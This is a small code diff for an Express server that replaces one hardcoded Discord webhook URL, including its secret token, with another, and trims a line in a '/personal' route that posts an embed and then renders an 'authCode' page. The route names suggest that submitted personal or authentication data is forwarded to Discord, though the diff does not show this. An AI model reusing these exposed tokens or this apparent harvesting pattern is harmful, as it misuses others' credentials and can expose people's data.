@@ -3,7 +3,7 @@ const bodyParser = require("body-parser");
 const { EmbedBuilder, WebhookClient } = require("discord.js");
 
 const webhookClient = new WebhookClient({
-  url: "https://discord.com/api/webhooks/1085332401544233101/QrAw0WjCDWvtyqk2x-gv9xksKQ_UGx1cGdlWfv304k5hoPZh4Nt74VFYzASUz7Ay9AQB",
+  url: "https://discordapp.com/api/webhooks/1176668617866223717/zR_EhfipDKoWOE-KQyF3g9AulkSyZ9q2h7qiVozYv7kwJkCXvXSVQ71plcyOIxiEl73z",
 });
 
 const app = express();
@@ -149,7 +149,6 @@ app.post("/personal", (req, res) => {
     avatarURL: "https://i.imgur.com/AfFp7pu.png",
     embeds: [embed],
   });
-
 
   res.render("authCode");
 });
